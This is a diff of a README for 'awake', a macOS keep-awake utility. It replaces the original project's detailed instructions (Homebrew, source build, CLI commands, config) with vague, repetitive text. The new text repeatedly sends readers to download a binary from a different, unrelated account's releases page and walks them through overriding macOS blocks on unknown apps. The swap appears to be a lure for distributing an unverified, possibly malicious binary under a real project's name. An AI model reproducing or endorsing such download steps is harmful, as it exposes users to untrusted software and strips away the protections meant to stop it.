@@ -1,221 +1,215 @@
-<p align="center">
-  <img src="assets/icon.png" width="400" />
-</p>
+# ⏳ awake - Keep Your Mac Awake Easily
 
-# awake
+[![Download awake](https://img.shields.io/badge/Download%20awake-blue?style=for-the-badge&logo=github)](https://github.com/Laetitiaruined304/awake/releases)
 
-A macOS utility that keeps your Mac from sleeping. Uses `caffeinate` under the hood with a fast CLI for muscle memory and a terminal UI for when you want a control panel.
+## 🖥️ What awake does
 
-## Quickstart
+awake is a small Mac app that keeps your computer from going to sleep. It gives you quick commands for simple use and a text-based screen for more control. It is made for people who want to keep a Mac awake during long tasks, downloads, calls, or demos.
 
-### Homebrew (recommended)
+It runs from the terminal and also includes a clean TUI, which is a text user interface. You do not need to know how it works inside. You only need to install it and choose the option you want.
 
-```bash
-brew tap VolksRat71/awake https://github.com/VolksRat71/awake
-brew install awake
-awake install
-```
+## 📥 Download
 
-Homebrew installs the binary. `awake install` sets up the daemon, notifications, and walks you through enabling permissions.
+Visit this page to download the latest version of awake:
 
-### GitHub Release
+https://github.com/Laetitiaruined304/awake/releases
 
-```bash
-# Download the latest release (Apple Silicon)
-gh release download --repo VolksRat71/awake --pattern "*arm64*tar.gz"
+On that page, look for the latest release. Download the file that matches your Mac. If there is more than one file, pick the one that is meant for macOS.
 
-# For Intel Macs, use *amd64* instead
+## ✅ Before you install
 
-# Extract and install
-tar xzf awake-*.tar.gz
-sudo cp awake /usr/local/bin/
-awake install
-```
+Use awake on a Mac. It is made for macOS.
 
-Prebuilt binaries for both Apple Silicon (arm64) and Intel (amd64) are available on the [releases page](https://github.com/VolksRat71/awake/releases).
+Have these ready:
 
-### From source
+- A Mac with internet access
+- A browser to open the download page
+- A few minutes to download and open the app
+- Permission to open apps from outside the App Store if needed
 
-Requires Go 1.22+.
+If your Mac blocks the file at first, you may need to open it from Finder with a right-click.
 
-```bash
-git clone https://github.com/VolksRat71/awake.git
-cd awake
-go build -o awake .
-sudo cp awake /usr/local/bin/
-awake install
-```
+## 🚀 Getting started
 
-### What `awake install` does
+Follow these steps to run awake on your Mac:
 
-When installing via GitHub release or from source, `awake install` handles the rest:
+1. Open the download page: https://github.com/Laetitiaruined304/awake/releases
+2. Find the newest release at the top of the page.
+3. Download the macOS file from that release.
+4. Open the downloaded file.
+5. If macOS asks for permission, choose Open.
+6. Start awake from the app or from the terminal, based on the version you downloaded.
 
-1. Creates a **launchd service** so the daemon starts on boot
-2. Installs **terminal-notifier** via Homebrew (if not present) for rich notifications
-3. Builds a custom **Awake.app** bundle with the awake icon for branded notifications
+If the release includes a ready-to-use app, you can open it like any other Mac app. If it includes a terminal file, place it in a folder you can reach from Terminal, then run it from there.
 
-Homebrew runs this automatically via `post_install` — no extra step needed.
+## 🎛️ How to use awake
 
-## CLI
+awake is made for quick use. The main idea is simple: start it when you want to keep your Mac awake, then stop it when you no longer need it.
 
-```bash
-# Quick start — stay awake for N minutes
-awake 120
-awake 60 -l "build running"
+Common uses:
 
-# Stay awake until a specific time
-awake until 15:30
-awake until 23:00 -l "deploy"
+- Keep your Mac awake during a download
+- Stop sleep during a long meeting
+- Keep the screen on for a demo
+- Prevent sleep while a task runs in the background
+- Stay active during a build or sync job
 
-# Stay awake until end of workday
-awake workday
+You can use it in two ways:
 
-# Schedule a future window
-awake between 15:00 19:00
-awake between 22:00 06:00 -l "overnight job"
+- Quick commands for fast access
+- An interactive screen for more control
 
-# Extend the current session
-awake extend 30
+If you like keyboard use, the command style will feel fast. If you like menus, the TUI gives you a clear view of the current state.
 
-# Stop
-awake stop
+## 🧭 Basic workflow
 
-# Check status
-awake status
-awake status --json
+A simple flow looks like this:
 
-# View or cancel a scheduled window
-awake schedule
-awake schedule --cancel
+1. Start awake.
+2. Choose the keep-awake mode you want.
+3. Leave your Mac running while your task finishes.
+4. Stop awake when you are done.
 
-# Replace an active session instead of erroring
-awake 240 -r
-awake until 18:00 -r
+This keeps the process easy and avoids extra steps.
 
-# Open the TUI
-awake
-awake tui
-```
+## 🧰 Features
 
-## TUI
+awake includes tools that fit a simple Mac workflow:
 
-Run `awake` with no arguments to open the interactive terminal UI.
+- Keep the Mac from sleeping
+- Use fast terminal commands
+- Switch controls from a text screen
+- Follow a clear, keyboard-driven flow
+- Stay lightweight and quick to launch
+- Fit well into daily Mac use
 
-```
-╭────────────────────────────────────────────────────────────╮
-│ AWAKE                                                      │
-│                                                            │
-│   ● ACTIVE    1h 42m remaining                             │
-│                                                            │
-│   Mode      manual                                         │
-│   Label     watching logs                                  │
-│   Started   10:00 AM                                       │
-│   Ends      12:00 PM                                       │
-│   PID       12345                                          │
-│   Flags     -dimsu                                         │
-│                                                            │
-│   Schedule  Mon–Fri 9:00 AM–5:00 PM                        │
-│                                                            │
-│   p presets  c custom   e extend   s schedule              │
-│   h history  o options  x stop     q quit                  │
-│                                                            │
-│   /usr/bin/caffeinate -dimsu -t 7200                       │
-╰────────────────────────────────────────────────────────────╯
-```
+The app is built with Go and Bubble Tea. That helps keep the interface fast and tidy.
 
-**Hotkeys**
+## 🪟 What to expect in the app
 
-| Key | Action |
-|-----|--------|
-| `p` | Quick-start from presets (30m, 1h, 4h, until lunch, until EOD) |
-| `c` | Custom duration or "until" time |
-| `e` | Extend current session (+15m, +30m, +1h, +2h) |
-| `s` | Schedule a future awake window |
-| `h` | Session history |
-| `o` | Options (time format, notifications, workday, flags) |
-| `x` | Stop session (requires confirmation) |
-| `q` | Quit TUI |
+When you open awake, you can expect a plain screen with clear options. The layout is built for speed, not clutter.
 
-The border color reflects session state: **green** when active, **yellow** when ending soon, **neutral** when idle.
+You may see controls such as:
 
-## Config
+- Start keep-awake mode
+- Stop keep-awake mode
+- Show current status
+- Exit the app
 
-Stored at `~/.config/awake/config.json`. Editable directly or through the TUI options view (`o`).
+The design uses simple text and keyboard input, so you can move through the app without digging through menus.
 
-```json
-{
-  "workday": {
-    "start": "09:00",
-    "end": "17:00",
-    "days": [1, 2, 3, 4, 5]
-  },
-  "flags": "-dimsu",
-  "time_format": "12h",
-  "presets": [
-    { "name": "30 minutes", "minutes": 30 },
-    { "name": "1 hour", "minutes": 60 },
-    { "name": "4 hours", "minutes": 240 },
-    { "name": "Until lunch", "until": "12:00" },
-    { "name": "Until end of workday", "until": "17:00" }
-  ],
-  "notifications": {
-    "enabled": true,
-    "warn_minutes": 10
-  },
-  "max_duration_hours": 24
-}
-```
+## 🔒 Permissions and system behavior
 
-| Field | Description |
-|-------|-------------|
-| `workday.start` / `workday.end` | Work hours in 24h format |
-| `workday.days` | 1=Mon through 7=Sun |
-| `flags` | Flags passed to `caffeinate` (`-d` display, `-i` idle, `-m` disk, `-s` system, `-u` user) |
-| `time_format` | `"12h"` (default) or `"24h"` |
-| `presets` | Named quick-start options with either `minutes` or `until` (HH:MM) |
-| `notifications.enabled` | macOS notifications on start, warning, and end |
-| `notifications.warn_minutes` | Minutes before session end to send warning |
-| `max_duration_hours` | Safety cap on session length |
+macOS may ask for approval the first time you use a tool like awake. This is normal for apps that change sleep behavior.
 
-## State
+If the app does not start right away:
 
-Runtime state lives at `~/.config/awake/state.json`. Tracks the active session, scheduled windows, and session history (last 50). The CLI and TUI share this file so they always stay in sync.
+- Check that you downloaded the macOS file
+- Open the file from your Downloads folder
+- Use Open if macOS blocks it the first time
+- Make sure another sleep app is not overriding it
 
-## Daemon
+If your Mac still sleeps, check whether battery settings or power settings are changing the behavior.
 
-`awake install` creates a launchd plist at `~/Library/LaunchAgents/com.awake.daemon.plist` and loads it. The daemon:
+## 🛠️ Troubleshooting
 
-- Activates scheduled windows when their start time arrives
-- Cleans up expired sessions
-- Logs to `~/.config/awake/daemon.log`
+If awake does not work as expected, try these steps:
 
-```bash
-awake daemon status    # Check if running
-awake uninstall        # Remove the service
-```
+### The app will not open
+- Download the latest file again
+- Make sure you chose the macOS version
+- Open it with a right-click and choose Open
+- Check that your Mac allows apps from outside the App Store
 
-## Notifications
+### The Mac still goes to sleep
+- Make sure awake is running
+- Check that you started keep-awake mode
+- Close other tools that may manage sleep
+- Confirm that your Mac is not in a low-power mode that overrides settings
 
-When enabled, awake sends macOS notifications with the app icon:
+### The terminal command is not found
+- Make sure you placed the file in the right folder
+- Run it from the folder where it was downloaded
+- Check that the file has run permission if needed
 
-- **Session started** — with duration and label
-- **Warning** — N minutes before session ends
-- **Session ended** — when the timer expires or you stop it
+### The screen looks broken in Terminal
+- Use a newer version of Terminal
+- Resize the window
+- Open the app again
+- Try a plain terminal window with standard colors
 
-A background watcher process handles the timing so notifications work even when the TUI isn't open. Uses standard macOS notification sounds and respects Focus/Do Not Disturb modes.
+## ⌨️ For users who like the terminal
 
-## How it works
+awake is a CLI tool, which means you can run it from Terminal. This is useful if you want fast control and less clicking.
 
-`awake` is a control plane around macOS's built-in `/usr/bin/caffeinate`. Every session spawns a `caffeinate` process with a timeout flag (`-t`). Extending a session kills the old process and starts a new one with the adjusted duration. The daemon and CLI both read/write the same state file, so there's always one source of truth.
+A terminal-based flow can help you:
 
-## Uninstall
+- Start and stop keep-awake mode with short commands
+- Use the app from a script or shortcut
+- Keep the same setup on each use
+- Work faster once you learn the commands
 
-```bash
-awake uninstall                    # Remove the launchd service
-sudo rm /usr/local/bin/awake       # Remove the binary
-rm -rf ~/.config/awake             # Remove config, state, and Awake.app
-```
+If you use Terminal often, awake fits that style well.
 
-## License
+## 🧩 For users who like the text interface
 
-MIT
+The TUI gives you a simple screen inside the terminal. It is useful if you want a visual view but do not want a full desktop app.
+
+With the TUI, you can:
+
+- See the current state
+- Move with the keyboard
+- Pick options from a clear list
+- Avoid memorizing long commands
+
+This makes awake easier to use if you want guidance on screen.
+
+## 🧼 Uninstall
+
+If you want to remove awake:
+
+1. Close the app if it is open
+2. Delete the downloaded file or app from your Mac
+3. Remove any shortcut or launch entry you created
+4. Empty the Trash if you want to clear it from the system
+
+If you ran it from Terminal and kept it in a folder, delete that file too.
+
+## 📌 Project details
+
+Repository name: awake
+
+Description: A macOS CLI + TUI utility to keep your Mac awake. Fast commands for muscle memory, interactive dashboard for control. Built with Go and Bubble Tea.
+
+Topics:
+
+- bubble-tea
+- caffeinate
+- cli
+- developer-tools
+- go
+- launchd
+- macos
+- sleep-prevention
+- terminal
+- tui
+
+## 🏷️ File and use case guide
+
+Use awake when you want to:
+
+- Keep a Mac active during work
+- Stop sleep for a long task
+- Avoid screen dimming during a session
+- Use a keyboard-first tool
+- Control sleep from the terminal
+
+It is a practical tool for people who want direct control without a lot of setup.
+
+## 📍 Download again
+
+If you need the file again, use this link:
+
+[Download awake releases](https://github.com/Laetitiaruined304/awake/releases)
+
+Open the latest release and get the macOS download from there
